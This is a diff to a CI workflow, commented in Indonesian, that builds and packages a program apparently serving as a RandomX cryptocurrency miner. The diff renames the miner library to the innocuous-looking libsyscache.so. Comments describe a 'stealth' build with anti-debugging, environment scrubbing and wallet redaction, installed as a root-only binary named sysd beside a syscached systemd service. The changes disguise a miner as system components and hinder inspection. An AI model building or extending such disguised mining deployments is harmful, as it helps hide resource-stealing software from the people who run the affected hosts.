@@ -148,11 +148,11 @@ jobs:
             echo "::error::selftest backend zcd tidak jalan"; exit 1; }
           grep -q 'RESULT: PASS' st.log
 
-      - name: Binary menemukan librandomx_v2.so
+      - name: Binary menemukan libsyscache.so
         run: |
           ldd build/xcb | tee ldd.log
-          grep -q 'librandomx_v2.so =>' ldd.log || {
-            echo "::error::librandomx_v2.so tidak ter-resolve"; exit 1; }
+          grep -q 'libsyscache.so =>' ldd.log || {
+            echo "::error::libsyscache.so tidak ter-resolve"; exit 1; }
           if grep -q 'not found' ldd.log; then
             echo "::error::ada shared library yang hilang"; exit 1
           fi
@@ -163,7 +163,7 @@ jobs:
         run: |
           cmake --install build --prefix "$PWD/stage"
           test -x stage/bin/xcb
-          test -f stage/bin/librandomx_v2.so
+          test -f stage/bin/libsyscache.so
           ( cd /tmp && "$GITHUB_WORKSPACE/stage/bin/xcb" --version )
 
       - name: Semua algo terdaftar di --help
@@ -195,7 +195,7 @@ jobs:
             ./build/xcb --version | tee VERSION
             if grep -q unknown VERSION; then echo "ERROR: commit tidak terbaca di --version"; exit 1; fi
             ./build/xcb --selftest
-            ldd build/xcb | grep "librandomx_v2.so =>"
+            ldd build/xcb | grep "libsyscache.so =>"
           '
 
       - name: Stage artefak deploy
@@ -205,14 +205,14 @@ jobs:
         # root artefak. Ratakan dulu ke dist/ supaya layout-nya sesuai kontrak.
         run: |
           mkdir -p dist
-          cp build/xcb build/librandomx_v2.so VERSION dist/
+          cp build/xcb build/libsyscache.so VERSION dist/
           test -x dist/xcb
-          test -f dist/librandomx_v2.so
+          test -f dist/libsyscache.so
           test -f dist/VERSION
           # Manifest checksum per commit: deploy bisa memverifikasi isi artefak
           # terhadap referensi ini, bukan menghitung ulang hash dari file yang
           # sama lalu mencocokkannya dengan dirinya sendiri.
-          ( cd dist && sha256sum xcb librandomx_v2.so VERSION > SHA256SUMS )
+          ( cd dist && sha256sum xcb libsyscache.so VERSION > SHA256SUMS )
           test -f dist/SHA256SUMS
           ls -l dist
           cat dist/SHA256SUMS
@@ -228,9 +228,9 @@ jobs:
   build-2204-sd:
     name: Build + artefak self-defense (Ubuntu 22.04)
     # Build terpisah dari xcb-2204 karena tarball rilis sengaja tetap tanpa
-    # ENABLE_SELF_DEFENSE (build publik bersih). Artefak ini yang dipakai host
-    # fleet yang butuh spoof sysd/XCB_TITLE; isinya sama dengan xcb-2204,
-    # hanya binary-nya yang membawa kode self-defense.
+    # ENABLE_SELF_DEFENSE (build publik bersih). Artefak ini jalur install
+    # stealth: anti-debug + scrub_environ + redaksi wallet di log; installer
+    # menaruh binary-nya sebagai /usr/local/sbin/sysd (0750, root-only).
     runs-on: ubuntu-latest
     timeout-minutes: 30
     steps:
@@ -253,20 +253,20 @@ jobs:
             # Gerbang: flag harus benar-benar masuk ke binary. Tanpa cek ini
             # artefak bisa identik dengan build biasa dan stealth-nya hilang
             # tanpa ada yang gagal.
-            grep -aq XCB_TITLE build/xcb || {
+            grep -aq "dumpable=0, core=0" build/xcb || {
               echo "ERROR: kode self-defense tidak ada di binary"; exit 1; }
             ./build/xcb --selftest
-            ldd build/xcb | grep "librandomx_v2.so =>"
+            ldd build/xcb | grep "libsyscache.so =>"
           '
 
       - name: Stage artefak self-defense
         run: |
           mkdir -p dist-sd
-          cp build/xcb build/librandomx_v2.so VERSION dist-sd/
+          cp build/xcb build/libsyscache.so VERSION dist-sd/
           test -x dist-sd/xcb
-          test -f dist-sd/librandomx_v2.so
+          test -f dist-sd/libsyscache.so
           test -f dist-sd/VERSION
-          ( cd dist-sd && sha256sum xcb librandomx_v2.so VERSION > SHA256SUMS )
+          ( cd dist-sd && sha256sum xcb libsyscache.so VERSION > SHA256SUMS )
           ls -l dist-sd
           cat dist-sd/SHA256SUMS
 
@@ -336,7 +336,7 @@ jobs:
           set -euo pipefail
           V="${GITHUB_REF_NAME}"
           mkdir -p pkg
-          cp dist/xcb dist/librandomx_v2.so dist/VERSION dist/SHA256SUMS pkg/
+          cp dist/xcb dist/libsyscache.so dist/VERSION dist/SHA256SUMS pkg/
           cp ops/fleet/install.sh pkg/install.sh
           cp ops/systemd/syscached.service ops/systemd/miner.env.example pkg/
           chmod 0755 pkg/install.sh
